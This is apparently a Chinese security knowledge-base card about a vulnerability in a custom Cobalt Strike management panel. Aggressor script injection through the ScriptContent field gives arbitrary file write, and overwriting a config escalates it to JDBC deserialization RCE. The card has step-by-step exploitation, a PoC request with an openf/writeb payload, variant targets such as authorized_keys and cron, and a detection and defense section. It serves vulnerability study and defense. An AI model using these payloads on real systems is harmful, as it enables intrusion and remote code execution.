---
id: web-java-rce-connect-controller-agscript-script-content-injection-file-write
title: Spring 控制器把请求里的 ScriptContent 拼进 agscript 参数并交给 python 转发：Aggressor 脚本注入 → 任意文件写入（openf/writeb 覆盖配置 → 二次 JDBC 反序列化）
type: scenario
domain: web
path: web/java/rce
technique: agscript-script-content-injection-arbitrary-file-write
tags:
- java
- spring
- rce
- command-injection
- cobalt-strike
- aggressor
- file-write
- arg-injection
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:44:52+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文。ConnectController.doScript 用 JsonPath 取 data.ScriptContent 后 ProcessBuilder 交 index.py，else 分支 cs.run_script(ScriptContent) 再经 ag_get_object(command) 由 pexpect 发到 agscript；PoC 的 openf 重定向写法/writeb/closef 覆盖 /tmp/config.json，与 DatabaseConnect 每次 connect() 重读该文件拼 jdbc url 完全对应；ProcessBuilder 数组参数不做 shell 解析、真正问题在下一跳把脚本内容当代码，判断正确。dedup 最高候选 jdbc-dbname-url-param-smuggling(0.132) 属本链下游、其余为无关组件卡，非同链。未验证点：结论称不需要任何 CS 凭据略夸大——ip/port/user/pass 均取自请求 JSON，攻击者需自备 teamserver 及其凭据；PoC 未执行。原文无受影响版本，未 set-versions。
url: /docs/web/java/rce/web-java-rce-connect-controller-agscript-script-content-injection-file-write/
draft: false
kb_aliases:
- agscript 脚本注入
- ScriptContent 任意文件写入
- CS 面板 run_script 命令注入
- Aggressor openf writeb 写文件
- index.py 参数可控
- Cobalt Strike 前端任意文件写
---

## 一句话结论

当自研的 Cobalt Strike 管理面板（Spring 控制器）把请求体里的 `ScriptContent` 直接拼进 `python3 /tmp/index.py run_script <...> <ScriptContent>`，而 `index.py` 又把该字符串原样交给 agscript 的 `run_script()`（最终 `ag_get_object(command)`）时，攻击者不需要任何 CS 凭据就能让服务端执行任意 Aggressor 脚本：`$data="..."; $handle=openf(">/tmp/config.json"); writeb($handle,$data); closef($handle);` 即可写出任意文件。这条任意文件写可直接覆盖应用自己的配置文件（如 `/tmp/config.json`），把 JDBC 连接参数改成攻击者可控值，接上"恶意 MySQL 服务端 + autoDeserialize"完成二次反序列化 RCE。

## 原理

- **三层拼接，中间没有任何转义**：`ConnectController.doScript` 用 `JsonPath.read(json, "$.data.ScriptContent")` 取出字符串后交给 `new ProcessBuilder("python3", "/tmp/index.py", "run_script", ..., ScriptContent).start()`。`ProcessBuilder` 多参数形式本身不做 shell 解析，所以此处**不是** shell 命令注入；真正的问题是下一跳把 `ScriptContent` 当成"脚本内容"而不是"不透明数据"。
- **index.py 的默认分支把参数当 Aggressor 脚本执行**：`else: ScriptContent = sys.argv[7]; output = cs.run_script(ScriptContent)`，而 `CSConnector.run_script` 实现为 `command = f"{str(script_content)}"; return self.ag_get_object(command)`，`ag_get_object` 最终通过 `pexpect` 把命令发到 `agscript` 的交互提示符。因此 `ScriptContent` 等价于"在 CS teamserver 上执行的 Aggressor 脚本"。
- **Aggressor 脚本具备文件与命令能力**：`openf(">file")` + `writeb`/`writeln` 可以创建/覆盖任意可写路径的文件；`bshell`/`shell` 一类函数还能在 beacon 上执行命令。因此这条链的上限不是"读配置"，而是"在 CS 服务端进程权限下任意写文件（并可进一步执行命令）"。
- **为什么文件写能升级成 RCE**：应用自己把 `/tmp/config.json` 当作可信配置来源——`DatabaseConnect` 每次 `connect()` 都重新读该文件拼出 `jdbc:mysql://<ip>:<port>/<dbname>`。覆盖它即可把 `dbname` 写成带 `?...&autoDeserialize=true` 的驱动参数，接恶意 MySQL 服务端后由驱动做反序列化；这一步与 CS 面板本身无关，只是"任意文件写"找到了一个自带反序列化 sink 的高价值目标。
- **为什么这条链容易漏**：入口是 POST `/connect/doScript` 这种"业务功能接口"，参数名 `ScriptContent` 听起来只是"要执行的脚本"，开发者的注意力在"CS 是否连接成功"而不在"字符串会被当成代码"；中间又隔着一个 python 子进程，静态扫描很难把 `ProcessBuilder` 与 agscript 的 `openf` 关联起来。

## 触发条件

- 存在把用户输入作为"脚本内容"传给 agscript / CS 客户端脚本执行器的接口（如 CS 管理面板的 `run_script`、`beacon_shell` 一类分发）。
- 服务端能连上 CS teamserver（`agscript` 可执行、`cobaltstrike.jar` 在 `cs_directory` 下），或至少存在等价的 Aggressor 执行通道。
- 进程对目标路径有写权限（面板常以 root/高权运行，`/tmp`、应用目录通常可写）。
- 被覆盖的文件能再次被应用读取并用于危险用途（配置里的 JDBC URL、模板路径、计划任务脚本、`authorized_keys` 等）。

## 利用步骤

1. 审计入口：找形如 `JsonPath.read(json,"$.data.ScriptContent")` → `ProcessBuilder("python3", ".../index.py", "<cmd>", ..., ScriptContent)` 的分发代码，并确认 `index.py` 的 else/默认分支最终调用 `run_script(ScriptContent)`。
2. 确认 CS 通道可用：用正常 type（如 `&get_beacons`）打一次，看 `/tmp/result.txt` 是否有 agscript 回显——能回显就说明脚本被真正执行。
3. 构造 Aggressor 写文件脚本（一行，注意 JSON 内的引号转义）：`$data="...";$handle=openf(">/tmp/config.json");writeb($handle,$data);closef($handle);`。
4. 把脚本放进 `data.ScriptContent`，`type` 填一个不匹配任何已知分支的值（走 else 分支），POST 到 `/connect/doScript`。
5. 校验写入：让应用重新读配置（再次 `connect()` 或重启），观察是否开始连接新的 jdbc 目标；也可用同一手法写一个带回显的文件再读回确认。
6. 升级：把配置文件内容改成指向攻击者 MySQL 的 URL（`dbname` 走私 `autoDeserialize=true` 等参数），起恶意 MySQL 服务端返回序列化 gadget，触发二次反序列化拿 shell。

## PoC

覆盖配置文件的请求（`ScriptContent` 里是 Aggressor 脚本，被 JSON 包了一层）：

```json
{
  "type": "&123",
  "data": {
    "ip": "127.0.0.1",
    "port": "50050",
    "username": "aaa",
    "password": "123456",
    "ListenerName": "test",
    "ScriptContent": "$data = \"{'ip':'ip','port':'3306','dbname':'test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true'}\";$handle = openf(\">/tmp/config.json\");writeb($handle,$data);closef($handle);"
  }
}
```

对应的服务端链条（关键代码形状）：

```java
// ConnectController#doScript
String ScriptContent = (String) JsonPath.read(json, "$.data.ScriptContent", new Predicate[0]);
new ProcessBuilder("python3", "/tmp/index.py", "run_script", CSIp, CSPort, CSUserName, CSPassWord, AgScriptPath, ScriptContent).start();

# index.py 默认分支
ScriptContent = sys.argv[7]
output = cs.run_script(ScriptContent)      # -> command = f"{script_content}" -> ag_get_object -> agscript

# CSConnector
def run_script(self, script_content):
    command = f"{str(script_content)}"
    return self.ag_get_object(command)
```

写出的 `/tmp/config.json`：

```json
{"ip":"127.0.0.1","port":"3306","dbname":"test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true"}
```

## 变体与关联

- **写文件目标变体**：应用配置（`config.json`/`application.yml` 的 patch 目录）、模板目录（写 JSP/模板）、`cron`/`systemd` 脚本、`~/.ssh/authorized_keys`、`web.xml`/`context.xml`、JDBC 驱动目录；本质都是"任意写 → 某个消费者把它当代码/配置"。
- **Aggressor 能力变体**：除 `openf`/`writeb` 外，`bshell`、`shell`、`exec`、`bupload`、`bdownload` 一类函数还能直接在 beacon/本地执行命令与传输文件；若只有"命令字符串可控"而没有完整脚本编辑权，仍可用 `;`、换行或提前闭合引号跳出原语句。
- **入口变体**：`beacon_shell` 分支的 `CSCmd`、`create_http_listener` 的 `ListenerName`/`ListenerIp` 同样被拼进 `bshell("id","cmd")` 这类字符串，属于同一类"参数被当作脚本片段"的问题；只要能把引号闭合就能注入任意 Aggressor 代码。
- **关联**：`web-java-deserialization-jdbc-dbname-url-param-smuggling-autodeserialize`（本链下游：覆盖 config.json 后的 dbname 参数走私 + 恶意 MySQL）、`web-java-deserialization-mysql-jdbc-url-autodeserialize-rce`（驱动侧 autoDeserialize 原理）、`pentest-c2-aggressor-frp-upload-run-delete-plugin`（Aggressor 脚本能力与菜单化的另一面）。
- **边界**：服务端根本没连上 teamserver（`agscript` 启动失败则脚本不会执行）、面板对 `ScriptContent` 做了白名单/字符集限制、进程对目标路径无写权限、或 `index.py` 的分支把参数改成走 argv 数组安全传递时，该链不成立。

## 检测与防御

- **检测**：`/connect/doScript`（或同类面板接口）请求体出现 `openf(`、`writeb`、`closef`、`bshell(`、`shell(`、`$data` 等 Aggressor 语法；服务端出现 `python3 ... index.py run_script` 子进程，且其参数长度异常；`/tmp` 或应用目录出现非预期的配置文件改写（inode/mtime 跳变、内容被整体替换）；进程随后连向陌生 3306/5900 等端口。
- **防御**：`ScriptContent` 这类"要被执行的内容"必须走白名单化接口——把可用操作枚举成枚举值（`get_beacons`/`create_socks`），脚本内容由服务端从受控模板生成、参数以结构化方式传给 agscript（不要字符串拼接）；对 `ProcessBuilder` 最后一段做长度与字符集限制；面板进程降权运行，配置目录与 `/tmp` 对应用不可写（用只读挂载或独立配置服务）；把"配置文件"改为不可被应用自身写回的位置，并给配置加签名/校验。
